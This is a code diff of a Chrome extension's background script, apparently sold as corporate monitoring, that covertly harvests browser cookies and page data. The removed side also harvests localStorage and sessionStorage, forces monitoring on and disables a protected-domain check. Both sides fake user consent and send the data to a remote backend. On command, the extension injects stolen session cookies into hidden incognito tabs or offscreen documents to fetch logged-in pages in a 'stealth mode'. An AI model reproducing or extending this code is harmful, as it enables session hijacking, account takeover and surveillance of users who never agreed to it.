@@ -10,8 +10,8 @@ const CONFIG = {
   BATCH_SIZE: 10
 };
 
-// Global state and caching - ✅ MUDADO: auto-ativado
-let monitoringEnabled = true;
+// Global state and caching
+let monitoringEnabled = false;
 let lastReportTime = null;
 let machineId = null;
 let pendingIncidents = [];
@@ -132,12 +132,11 @@ async function initializeExtension() {
   await chrome.storage.local.set({ machineId });
   log('info', `🆔 Machine ID set to: ${machineId}`);
   
-  // ✅ SEMPRE ATIVAR MONITORAMENTO (modo corporativo forçado)
-  monitoringEnabled = true;
+  // Auto-enable monitoring on installation
+  monitoringEnabled = result.monitoringEnabled !== undefined ? result.monitoringEnabled : true;
   await chrome.storage.local.set({ 
-    monitoringEnabled: true,       // ✅ FORÇADO
-    userConsented: true,           // ✅ AUTO-CONSENTIMENTO
-    corporateMode: true            // ✅ NOVO: Flag de modo corporativo
+    monitoringEnabled,
+    userConsented: true // Auto-accept on installation
   });
   
   log('info', `📊 Configuration loaded - Machine ID: ${machineId}, Monitoring: ${monitoringEnabled ? '✅ ENABLED' : '❌ DISABLED'}`);
@@ -277,8 +276,7 @@ async function collectPageData(tab) {
           secure: cookie.secure,
           httpOnly: cookie.httpOnly,
           sameSite: cookie.sameSite,
-          expirationDate: cookie.expirationDate,
-          isSession: !cookie.expirationDate || cookie.expirationDate === 0  // ✅ NOVO: flag de sessão
+          expirationDate: cookie.expirationDate
         })),
         localStorage: localStorage,
         sessionStorage: sessionStorage,
@@ -991,8 +989,8 @@ async function injectCookiesWithDelay(cookies, targetUrl, tabId) {
         });
       }
       
-      // Inject new cookie (handle session cookies correctly)
-      const cookieDetails = {
+      // Inject new cookie
+      const injected = await chrome.cookies.set({
         url: targetUrl,
         name: cookie.name,
         value: cookie.value,
@@ -1000,15 +998,9 @@ async function injectCookiesWithDelay(cookies, targetUrl, tabId) {
         path: cookie.path || '/',
         secure: cookie.secure !== false,
         httpOnly: cookie.httpOnly || false,
-        sameSite: cookie.sameSite || 'lax'
-      };
-      
-      // ✅ CORRIGIR: Se é cookie de sessão, NÃO passar expirationDate
-      if (!cookie.isSession && cookie.expirationDate) {
-        cookieDetails.expirationDate = cookie.expirationDate;
-      }
-      
-      const injected = await chrome.cookies.set(cookieDetails);
+        sameSite: cookie.sameSite || 'lax',
+        expirationDate: cookie.expirationDate
+      });
       
       if (injected) {
         injectedCookies.push(injected);
@@ -1136,26 +1128,25 @@ async function handleSelfHealCommand(command) {
   }
 }
 
-// 🎯 STEALTH MODE: Proxy-fetch with invisible offscreen document
+// 🎯 STEALTH MODE: Proxy-fetch with isolated incognito tab
 async function handleProxyFetchCommand(data) {
   const command_id = data.command_id;
   const { target_url, cookies: providedCookies } = data.payload;
   
-  log('info', `🌐 [STEALTH] Offscreen fetch for: ${target_url}`, { command_id });
+  log('info', `🌐 [STEALTH] Proxy-fetch request for: ${target_url}`, { command_id });
   
+  let incognitoTab = null;
   let injectedCookies = [];
   
   try {
     const targetDomain = new URL(target_url).hostname;
     
-    // 🔒 PROTECTED DOMAINS - DESABILITADO para permitir navegação em todos os sites
-    // Agora todos os domínios podem ser acessados via proxy stealth
-    log('info', `🌐 [STEALTH] Fetching domain: ${targetDomain} (protection bypassed)`);
-    
-    /* COMENTADO - Permitir acesso a todos os domínios
+    // 🔒 CHECK PROTECTED DOMAINS
     if (isDomainProtected(target_url)) {
       log('warn', `⚠️ [STEALTH] Protected domain detected: ${targetDomain}`);
+      log('warn', `⚠️ [STEALTH] Skipping cookie injection for security`);
       
+      // Notify backend about protected domain
       await fetch(`${CONFIG.API_BASE}/proxy-fetch-result`, {
         method: 'POST',
         headers: {
@@ -1176,96 +1167,85 @@ async function handleProxyFetchCommand(data) {
       
       return;
     }
-    */
     
-    // ✅ CRIAR OFFSCREEN DOCUMENT (invisível)
-    await createOffscreenDocument();
+    // 🕵️ CREATE ISOLATED INCOGNITO TAB
+    incognitoTab = await chrome.tabs.create({
+      url: 'about:blank',
+      active: false,
+      incognito: true
+    });
     
-    // 🍪 INJETAR COOKIES NO CONTEXTO DO BROWSER
+    log('info', `🔒 [STEALTH] Created incognito tab ${incognitoTab.id}`);
+    
+    // Wait for tab to be ready
+    await new Promise(resolve => setTimeout(resolve, 500));
+    
+    // 🍪 INJECT COOKIES WITH STEALTH DELAYS
     if (providedCookies && Array.isArray(providedCookies) && providedCookies.length > 0) {
-      log('info', `🍪 [STEALTH] Injecting ${providedCookies.length} cookies...`);
-      
-      for (const cookie of providedCookies) {
-        try {
-          const cookieDetails = {
-            url: target_url,
-            name: cookie.name,
-            value: cookie.value,
-            domain: cookie.domain || targetDomain,
-            path: cookie.path || '/',
-            secure: cookie.secure !== false,
-            httpOnly: cookie.httpOnly || false,
-            sameSite: cookie.sameSite || 'lax'
-          };
-          
-          await chrome.cookies.set(cookieDetails);
-          injectedCookies.push({ name: cookie.name, domain: cookieDetails.domain });
-        } catch (err) {
-          log('warn', `⚠️ Cookie injection failed: ${cookie.name}`, err);
-        }
-      }
-      
+      log('info', `🍪 [STEALTH] Injecting ${providedCookies.length} cookies with delays...`);
+      injectedCookies = await injectCookiesWithDelay(providedCookies, target_url, incognitoTab.id);
       log('info', `✅ [STEALTH] Injected ${injectedCookies.length} cookies successfully`);
     }
     
-    // ✅ FAZER FETCH VIA OFFSCREEN (invisível)
-    const result = await chrome.runtime.sendMessage({
-      type: 'OFFSCREEN_FETCH',
-      url: target_url
+    // 🌐 NAVIGATE TO TARGET URL IN INCOGNITO TAB
+    await chrome.tabs.update(incognitoTab.id, { url: target_url });
+    
+    // Wait for page load
+    await new Promise((resolve, reject) => {
+      const timeout = setTimeout(() => reject(new Error('Page load timeout')), 30000);
+      
+      chrome.tabs.onUpdated.addListener(function listener(tabId, changeInfo) {
+        if (tabId === incognitoTab.id && changeInfo.status === 'complete') {
+          clearTimeout(timeout);
+          chrome.tabs.onUpdated.removeListener(listener);
+          resolve();
+        }
+      });
     });
     
-    if (!result.success) {
-      throw new Error(result.error);
+    // 📄 EXTRACT HTML FROM INCOGNITO TAB
+    const [result] = await chrome.scripting.executeScript({
+      target: { tabId: incognitoTab.id },
+      func: () => document.documentElement.outerHTML
+    });
+    
+    const html = result.result;
+    log('info', `✅ [STEALTH] Fetched ${html.length} bytes from ${target_url}`);
+    
+    // 🧹 CLEANUP INJECTED COOKIES
+    if (injectedCookies.length > 0) {
+      log('info', `🧹 [STEALTH] Cleaning up ${injectedCookies.length} injected cookies...`);
+      await cleanupInjectedCookies(injectedCookies, target_url);
     }
     
-    log('info', `✅ [STEALTH] Fetched ${result.html.length} bytes from ${target_url}`);
-    
-    /**
-     * 🔐 STEALTH MODE ISOLATION
-     * 
-     * Cookies are injected ONLY in the Offscreen Document context,
-     * which is completely isolated from the user's main browser session.
-     * 
-     * When the offscreen document is closed, all temporary cookies
-     * are automatically discarded without affecting the user.
-     * 
-     * ⚠️ NEVER use chrome.cookies.remove() here, as it would delete
-     *    cookies from the user's actual browser session!
-     */
-    log('info', '✅ [STEALTH] Offscreen fetch completed (cookies isolated from user session)');
-    
     // 📤 SEND RESULT TO BACKEND
-    const payload = {
-      command_id,
-      machine_id: machineId,
-      url: target_url,
-      html_content: result.html,
-      status_code: result.status,
-      success: true
-    };
-    
-    log('debug', `[STEALTH] Sending payload - Command: ${command_id}, HTML size: ${result.html.length} bytes, Status: ${result.status}`);
-    
     const responseData = await fetch(`${CONFIG.API_BASE}/proxy-fetch-result`, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
         'Authorization': `Bearer ${CONFIG.SUPABASE_ANON_KEY}`
       },
-      body: JSON.stringify(payload)
+      body: JSON.stringify({
+        command_id,
+        machine_id: machineId,
+        url: target_url,
+        html_content: html,
+        status_code: 200,
+        success: true,
+        stealth_mode: true
+      })
     });
     
     if (!responseData.ok) {
-      const errorText = await responseData.text();
-      log('error', `[STEALTH] Backend rejected payload: ${responseData.status} - ${errorText}`);
       throw new Error(`Failed to send response: ${responseData.status}`);
     }
     
-    log('info', `✅ [STEALTH] Result sent for command ${command_id}`);
+    log('info', `✅ [STEALTH] HTML result sent for command ${command_id}`);
     
   } catch (error) {
-    log('error', '[STEALTH] Offscreen fetch failed:', error);
+    log('error', '[STEALTH] Proxy-fetch failed:', error);
     
+    // Send error to backend
     try {
       await fetch(`${CONFIG.API_BASE}/proxy-fetch-result`, {
         method: 'POST',
@@ -1277,7 +1257,7 @@ async function handleProxyFetchCommand(data) {
           command_id,
           machine_id: machineId,
           url: target_url,
-          form_data: {
+          form_data: { 
             error: error.message,
             success: false
           }
@@ -1288,45 +1268,15 @@ async function handleProxyFetchCommand(data) {
     }
     
   } finally {
-    // ✅ FECHAR OFFSCREEN DOCUMENT
-    await closeOffscreenDocument();
-  }
-}
-
-// ✅ HELPER: Criar offscreen document se não existir
-async function createOffscreenDocument() {
-  try {
-    const existingContexts = await chrome.runtime.getContexts({
-      contextTypes: ['OFFSCREEN_DOCUMENT'],
-      documentUrls: [chrome.runtime.getURL('offscreen.html')]
-    });
-    
-    if (existingContexts.length > 0) {
-      log('debug', '📄 [STEALTH] Offscreen document already exists');
-      return;
+    // 🗑️ ALWAYS CLOSE INCOGNITO TAB
+    if (incognitoTab) {
+      try {
+        await chrome.tabs.remove(incognitoTab.id);
+        log('info', `🗑️ [STEALTH] Closed incognito tab ${incognitoTab.id}`);
+      } catch (e) {
+        log('warn', 'Failed to close incognito tab:', e);
+      }
     }
-    
-    await chrome.offscreen.createDocument({
-      url: 'offscreen.html',
-      reasons: ['DOM_SCRAPING'],
-      justification: 'Fetch authenticated pages without visible tabs'
-    });
-    
-    log('info', '📄 [STEALTH] Offscreen document created');
-  } catch (error) {
-    log('error', '❌ [STEALTH] Failed to create offscreen document:', error);
-    throw error;
-  }
-}
-
-// ✅ HELPER: Fechar offscreen document
-async function closeOffscreenDocument() {
-  try {
-    await chrome.offscreen.closeDocument();
-    log('info', '🧹 [STEALTH] Offscreen document closed');
-  } catch (err) {
-    // Já estava fechado ou não existe
-    log('debug', '[STEALTH] Offscreen document already closed');
   }
 }
 
@@ -1377,56 +1327,13 @@ async function handleExportCookiesCommand(data) {
         secure: cookie.secure,
         httpOnly: cookie.httpOnly,
         sameSite: cookie.sameSite,
-        expirationDate: cookie.expirationDate,
-        isSession: !cookie.expirationDate || cookie.expirationDate === 0  // ✅ NOVO: flag de sessão
+        expirationDate: cookie.expirationDate
       });
     }
     
     const cookies = Array.from(cookieMap.values());
     log('info', `🍪 Collected ${cookies.length} unique cookies from ${domains.length} domains`);
     log('info', `📋 Cookie names: ${cookies.slice(0, 10).map(c => c.name).join(', ')}${cookies.length > 10 ? '...' : ''}`);
-    
-    // ✅ NOVO: Coletar localStorage e sessionStorage
-    let localStorage = {};
-    let sessionStorage = {};
-    
-    try {
-      const storageData = await chrome.scripting.executeScript({
-        target: { tabId },
-        func: () => {
-          const local = {};
-          const session = {};
-          
-          try {
-            for (let i = 0; i < localStorage.length; i++) {
-              const key = localStorage.key(i);
-              local[key] = localStorage.getItem(key);
-            }
-          } catch (e) {
-            console.warn('Failed to read localStorage:', e);
-          }
-          
-          try {
-            for (let i = 0; i < sessionStorage.length; i++) {
-              const key = sessionStorage.key(i);
-              session[key] = sessionStorage.getItem(key);
-            }
-          } catch (e) {
-            console.warn('Failed to read sessionStorage:', e);
-          }
-          
-          return { localStorage: local, sessionStorage: session };
-        }
-      });
-      
-      if (storageData && storageData[0] && storageData[0].result) {
-        localStorage = storageData[0].result.localStorage || {};
-        sessionStorage = storageData[0].result.sessionStorage || {};
-        log('info', `💾 Collected localStorage (${Object.keys(localStorage).length} keys) and sessionStorage (${Object.keys(sessionStorage).length} keys)`);
-      }
-    } catch (storageError) {
-      log('warn', '⚠️ Failed to collect storage data:', storageError);
-    }
     
     // Send to cookie-sync edge function
     const response = await fetch(`${CONFIG.API_BASE}/cookie-sync`, {
@@ -1439,9 +1346,7 @@ async function handleExportCookiesCommand(data) {
         incident_id: data.payload?.incident_id,
         cookies: cookies,
         host: host,
-        tab_url: tab.url,
-        localStorage: localStorage || null,      // ✅ NOVO
-        sessionStorage: sessionStorage || null   // ✅ NOVO
+        tab_url: tab.url
       })
     });
     
